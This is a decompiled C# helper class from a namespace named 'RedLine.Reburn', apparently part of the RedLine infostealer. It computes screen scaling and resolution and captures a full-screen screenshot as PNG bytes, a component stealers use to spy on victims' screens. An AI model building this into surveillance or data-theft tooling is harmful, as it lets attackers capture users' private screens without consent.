using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RedLine.Reburn.Data.Helpers;

public static class DisplayHelper
{
	public enum DeviceCap
	{
		VERTRES = 10,
		DESKTOPVERTRES = 117
	}

	[DllImport("gdi32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
	public static extern int GetDeviceCaps(IntPtr hDC, int nIndex);

	public static double GetWindowsScreenScalingFactor(bool percentage = true)
	{
		Graphics obj = Graphics.FromHwnd(IntPtr.Zero);
		IntPtr hdc = obj.GetHdc();
		int deviceCaps = GetDeviceCaps(hdc, 10);
		double num = Math.Round((double)GetDeviceCaps(hdc, 117) / (double)deviceCaps, 2);
		if (percentage)
		{
			num *= 100.0;
		}
		obj.ReleaseHdc(hdc);
		obj.Dispose();
		return num;
	}

	public static Size GetDisplayResolution()
	{
		double windowsScreenScalingFactor = GetWindowsScreenScalingFactor(percentage: false);
		double num = (double)Screen.get_PrimaryScreen().get_Bounds().Width * windowsScreenScalingFactor;
		double num2 = (double)Screen.get_PrimaryScreen().get_Bounds().Height * windowsScreenScalingFactor;
		return new Size((int)num, (int)num2);
	}

	public static byte[] GetScreenshot()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		try
		{
			Size displayResolution = GetDisplayResolution();
			Bitmap val = new Bitmap(displayResolution.Width, displayResolution.Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.set_InterpolationMode((InterpolationMode)4);
				val2.set_PixelOffsetMode((PixelOffsetMode)1);
				val2.set_SmoothingMode((SmoothingMode)1);
				val2.CopyFromScreen(new Point(0, 0), new Point(0, 0), displayResolution);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			return ImageToByte((Image)(object)val);
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static byte[] ImageToByte(Image img)
	{
		try
		{
			if (img != null)
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					img.Save((Stream)memoryStream, ImageFormat.get_Png());
					return memoryStream.ToArray();
				}
			}
			return null;
		}
		catch (Exception)
		{
			return null;
		}
	}
}
